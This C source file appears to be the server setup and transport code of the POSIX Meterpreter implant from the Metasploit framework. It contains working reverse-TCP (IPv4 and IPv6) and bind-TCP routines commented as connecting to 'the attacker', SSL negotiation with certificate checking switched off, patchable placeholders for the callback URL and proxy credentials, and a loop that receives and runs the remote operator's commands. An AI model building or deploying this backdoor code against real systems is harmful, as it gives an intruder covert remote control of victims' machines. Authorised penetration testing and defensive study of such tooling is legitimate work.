/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <netdb.h>

const DWORD RETRY_TIMEOUT_MS = 1000;

char *global_meterpreter_transport =
	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char *global_meterpreter_url =
	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char *global_meterpreter_ua =
	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char *global_meterpreter_proxy =
	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char *global_meterpreter_proxy_username =
	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char *global_meterpreter_proxy_password =
	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout = 0xaf79257f;

#define SetHandleInformation(a, b, c)
const unsigned int hAppInstance = 0x504b5320;	// 'PKS '

/*! @brief An array of locks for use by OpenSSL. */
static LOCK **ssl_locks = NULL;

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	struct sockaddr_in sock = { 0 };
	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	// try connect to the attacker at least once
	while (connect(socketHandle, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
	{
		// retry with a Sleep if it fails, or exit the process on failure
		if (retryAttempts-- <= 0)
		{
			return WSAGetLastError();
		}

		sleep(RETRY_TIMEOUT_MS);
	}

	*socketBuffer = socketHandle;

	return ERROR_SUCCESS;
}

/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	struct addrinfo hints = { 0 };
	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	struct addrinfo* addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return WSAGetLastError();
	}


	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return WSAGetLastError();
	}

	dprintf("[STAGELESS IPV6] Socket successfully created");
	while (retryAttempts-- > 0)
	{
    struct addrinfo* address = NULL;
		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
		for (address = addresses; address != NULL; address = address->ai_next)
		{
			((struct sockaddr_in6*)address->ai_addr)->sin6_scope_id = scopeId;

			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		sleep(RETRY_TIMEOUT_MS);
	}

	closesocket(socketHandle);
	freeaddrinfo(addresses);
	return WSAGetLastError();

}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 */
DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// prepare a connection listener for the attacker to connect to
	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct sockaddr_in sock = { 0 };
	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	if (bind(listenSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	if (listen(listenSocket, 1) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	// Setup, ready to go, now wait for the connection.
	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);

	// don't bother listening for other connections
	closesocket(listenSocket);

	if (acceptSocket == INVALID_SOCKET)
	{
		return WSAGetLastError();
	}

	*socketBuffer = acceptSocket;
	return ERROR_SUCCESS;
}


/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static void server_locking_callback(int mode, int type, const char *file, int line)
{
	if (mode & CRYPTO_LOCK) {
		lock_acquire(ssl_locks[type]);
	} else {
		lock_release(ssl_locks[type]);
	}
}

SOCKET tcp_transport_get_socket(Transport* transport)
{
	return ((TcpTransportContext*)transport->ctx)->fd;
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(void)
{
	return pthread_self();
}

/*
 * Callback function for dynamic lock creation for OpenSSL.
 */
static struct CRYPTO_dynlock_value *server_dynamiclock_create(const char *file, int line)
{
	return (struct CRYPTO_dynlock_value *)lock_create();
}

/*
 * Callback function for dynamic lock locking for OpenSSL.
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value *l, const char *file,
	int line)
{
	LOCK *lock = (LOCK *) l;
	if (mode & CRYPTO_LOCK) {
		lock_acquire(lock);
	} else {
		lock_release(lock);
	}
}

/*
 * Callback function for dynamic lock destruction for OpenSSL.
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value *l, const char *file, int line)
{
	lock_destroy((LOCK *) l);
}

/*
 * Flush all pending data on the connected socket before doing SSL.
 */
static void server_socket_flush(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	fd_set fdread;
	DWORD ret;
	char buff[4096];
	lock_acquire(remote->lock);

	while (1) {
		struct timeval tv;
		LONG data;
		FD_ZERO(&fdread);
		FD_SET(ctx->fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		data = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
			break;

		ret = recv(ctx->fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0) {
			break;
		}
	}
	lock_release(remote->lock);
}

/*
 * Poll a socket for data to recv and block when none available.
 */
static LONG server_socket_poll(Remote * remote, long timeout)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	struct timeval tv;
	LONG result;
	fd_set fdread;

	lock_acquire(remote->lock);
	FD_ZERO(&fdread);
	FD_SET(ctx->fd, &fdread);
	tv.tv_sec = 0;
	tv.tv_usec = timeout;
	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);

	if (result == -1 &&
	    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
		result = 0;

	lock_release(remote->lock);
	return result;
}

/*
 * Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 */
static int server_initialize_ssl(Remote * remote)
{
	int i;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL) {
    dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
		lock_release(remote->lock);
		return -1;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++)
		ssl_locks[i] = lock_create();

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
	lock_release(remote->lock);

	return 0;
}

/*
 * Bring down the OpenSSL subsystem
 */
BOOL server_destroy_ssl(Remote * remote)
{
	TcpTransportContext* ctx = NULL;
	int i;

	if (remote) {
		dprintf("[SERVER] Destroying SSL");
		lock_acquire(remote->lock);
		if (remote->transport && remote->transport->ctx) {
			ctx = (TcpTransportContext*)remote->transport->ctx;
			SSL_free(ctx->ssl);
			SSL_CTX_free(ctx->ctx);
		}
		CRYPTO_set_locking_callback(NULL);
		CRYPTO_set_id_callback(NULL);
		CRYPTO_set_dynlock_create_callback(NULL);
		CRYPTO_set_dynlock_lock_callback(NULL);
		CRYPTO_set_dynlock_destroy_callback(NULL);

		for (i = 0; i < CRYPTO_num_locks(); i++)
			lock_destroy(ssl_locks[i]);

		free(ssl_locks);
		lock_release(remote->lock);
	}

  return TRUE;
}

/*
 * Negotiate SSL on the socket.
 */
static BOOL server_negotiate_ssl(Remote * remote)
{
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	BOOL success = TRUE;
	DWORD ret = 0;
	DWORD res = 0;
	lock_acquire(remote->lock);

	ctx->meth = TLSv1_client_method();
	ctx->ctx = SSL_CTX_new(ctx->meth);
	SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
	ctx->ssl = SSL_new(ctx->ctx);
	SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
	if (SSL_set_fd(ctx->ssl, ctx->fd) == 0) {
		dprintf("[SERVER] set fd failed");
		success = FALSE;
		goto out;
	}

	do {
		if ((ret = SSL_connect(ctx->ssl)) != 1) {
			res = SSL_get_error(ctx->ssl, ret);
			dprintf("[SERVER] connect failed %d\n", res);
			if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE) {

				// Catch non-blocking socket errors and retry
				continue;
			}
			success = FALSE;
			break;
		}
	} while (ret != 1);

	if (success == FALSE)
		goto out;

	dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
	if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0) {
		dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret,
			SSL_get_error(ctx->ssl, ret));
	}

out:
	lock_release(remote->lock);
	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
	if (ret < 0)
		success = FALSE;
	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static BOOL server_dispatch(Remote * remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet *packet = NULL;
	THREAD *cpt = NULL;
	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS) {
		return result;
	}
	while (running) {
		if (event_poll(dispatchThread->sigterm, 0)) {
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}
		result = server_socket_poll(remote, 100);
		if (result > 0) {
			result = remote->transport->packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS) {
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}
			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}

		else if (result < 0) {
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...")
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...")
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");
	return result;
}

BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
{
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	char* asciiUrl = remote->transport->url;

	if (strncmp(asciiUrl, "tcp", 3) == 0)
	{
		const int iRetryAttempts = 30;
		char* pHost = strstr(asciiUrl, "//") + 2;
		char* pPort = strrchr(pHost, ':') + 1;

		// check if we're using IPv6
		if (asciiUrl[3] == '6')
		{
			char* pScopeId = strrchr(pHost, '?') + 1;
			*(pScopeId - 1) = '\0';
			*(pPort - 1) = '\0';
			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
		}
		else
		{
			u_short usPort = (u_short)atoi(pPort);

			// if no host is specified, then we can assume that this is a bind payload, otherwise
			// we'll assume that the payload is a reverse_tcp one and the given host is valid
			if (*pHost == ':')
			{
				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
				result = bind_tcp(usPort, &ctx->fd);
			}
			else
			{
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
			}
		}
	}
	else
	{
		// assume that we have been given a valid socket given that there's no stageless information
		ctx->fd = socket;
	}

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(remote);

	dprintf("[SERVER] Initializing SSL...");
	if (server_initialize_ssl(remote))
	{
		dprintf("[SERVER] SSL failed to initialize");
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(remote))
	{
		dprintf("[SERVER] Failed to negotiate SSL");
		return FALSE;
	}

	return TRUE;
}

void transport_destroy_tcp(Remote* remote)
{
	if (remote && remote->transport)
	{
		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport);
	}
}

Transport* transport_create_tcp(char* url)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	dprintf("[TRANS TCP] Creating tcp transport for url %s", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	transport->url = strdup(url);
	transport->packet_receive = packet_receive_via_ssl;
	transport->packet_transmit = packet_transmit_via_ssl;
	transport->transport_init = configure_tcp_connection;
	transport->transport_deinit = server_destroy_ssl;
	transport->transport_destroy = transport_destroy_tcp;
	transport->server_dispatch = server_dispatch;
	transport->get_socket = tcp_transport_get_socket;
	transport->ctx = ctx;
	transport->type = METERPRETER_TRANSPORT_SSL;

	return transport;
}

Transport* transport_create(char* transport, char* url)
{
	Transport* t = NULL;
	dprintf("[TRANSPORT] Type = %S", transport);
	dprintf("[TRANSPORT] URL = %S", url);

	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
	{
		t = transport_create_tcp(url);
	}
	else
	{
		dprintf("[TRANSPORT] not supported");
	}

	return t;
}

/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup(SOCKET fd)
{
	THREAD * dispatchThread = NULL;
	Remote *remote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing...");
	int local_error = 0;

	srand(time(NULL));

	printf("[SERVER] module loaded at 0x%08X", hAppInstance);

	// Open a THREAD item for the servers main thread, we use this to manage migration later.
	dispatchThread = thread_open();
	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
		dispatchThread->handle, dispatchThread->id, dispatchThread->sigterm);

	if (!(remote = remote_allocate())) {
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		goto out;
	}

	// Store our thread handle
	remote->hServerThread = dispatchThread->handle;

	dprintf("[SERVER] Registering dispatch routines...");
	register_dispatch_routines();

	// allocate the "next transport" information
	dprintf("[SERVER] creating transport");
	remote->nextTransport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url);

	while (remote->nextTransport) {
		remote->transport = remote->nextTransport;
		remote->nextTransport = NULL;

		dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
		if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd)) {
			break;
		}

		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
		remote->transport->server_dispatch(remote, dispatchThread);

		if (remote->transport->transport_deinit) {
			remote->transport->transport_deinit(remote);
		}

		remote->transport->transport_destroy(remote);
	}

	dprintf("[SERVER] Deregistering dispatch routines...");
	deregister_dispatch_routines(remote);

	remote_deallocate(remote);

out:
	res = GetLastError();

	dprintf("[SERVER] Finished.");
	return res == ERROR_SUCCESS;
}
